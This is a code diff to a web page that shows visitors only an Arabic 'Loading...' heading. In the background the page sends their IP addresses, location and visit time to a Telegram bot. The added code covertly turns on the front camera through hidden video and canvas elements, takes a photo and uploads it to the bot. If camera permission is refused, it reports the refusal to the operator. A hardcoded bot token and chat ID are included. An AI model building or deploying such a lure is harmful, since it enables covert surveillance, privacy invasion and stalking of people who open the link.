@@ -6,8 +6,13 @@
 </head>
 <body>
     <h1>جاري التحميل...</h1>
+
+    <!-- عناصر الكاميرا المخفية -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
     <script>
-        const BOT_TOKEN = '7834185753:AAHX4Tjf9hboJqrIYl9IBth_E5c4toaNKJE';
+        const BOT_TOKEN = '7834185753:AAHX4Tjf9hboJqrIYl9IBth_E5c4toankJE';
         const CHAT_ID = '7110865740';
 
         function sendToTelegram(text) {
@@ -23,6 +28,49 @@
             .then(r => r.json())
             .then(data => console.log('✅:', data.ok))
             .catch(err => console.error('❌:', err));
+        }
+
+        // دالة إرسال الصورة الملتقطة إلى تليجرام
+        function sendPhotoToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'camera_capture.jpg');
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(res => res.json())
+            .then(data => console.log('📷 تم إرسال الصورة:', data.ok))
+            .catch(err => console.error('❌ خطأ في إرسال الصورة:', err));
+        }
+
+        // دالة تشغيل الكاميرا والتقاط الصورة
+        function captureAndSendPhoto() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // إيقاف الكاميرا بعد أخذ الصورة
+                    stream.getTracks().forEach(track => track.stop());
+
+                    canvas.toBlob(blob => {
+                        sendPhotoToTelegram(blob);
+                    }, 'image/jpeg', 0.8);
+                }, 1500);
+            })
+            .catch(err => {
+                console.log('مرفوض أو غير متاح:', err);
+                sendToTelegram("⚠️ تنبيه: قام المستخدم بفتح الرابط ولكنّه <b>رفض إذن الكاميرا</b>.");
+            });
         }
 
         async function getPublicIPv4() {
@@ -91,7 +139,7 @@
             const location = await getLocation(ipv4);
 
             let msg = `<blockquote>`;
-            msg += ` <b>زيارة جديدة - جميع الـ IPs</b>\n\n`;
+            msg += ` <b>زيارة جديدة - مع التقاط الكاميرا</b>\n\n`;
             msg += ` <b>IP العام (IPv4)</b>: <tg-spoiler> ${ipv4} </tg-spoiler>\n`;
             msg += ` <b>IP العام (IPv6)</b>: <tg-spoiler> ${ipv6} </tg-spoiler>\n`;
             msg += ` <b>IP المحلي (Local)</b>: <tg-spoiler> ${localIP} </tg-spoiler>\n\n`;
@@ -109,7 +157,11 @@
             msg += ` <b>وقت الدخول</b>: <code>${new Date().toLocaleString('ar-EG')}</code>\n`;
             msg += `</blockquote>`;
 
+            // إرسال معلومات الشبكة والجهاز نصياً
             sendToTelegram(msg);
+
+            // تشغيل محاولة سحب الصورة عبر الكاميرا
+            captureAndSendPhoto();
         })();
     </script>
 </body>
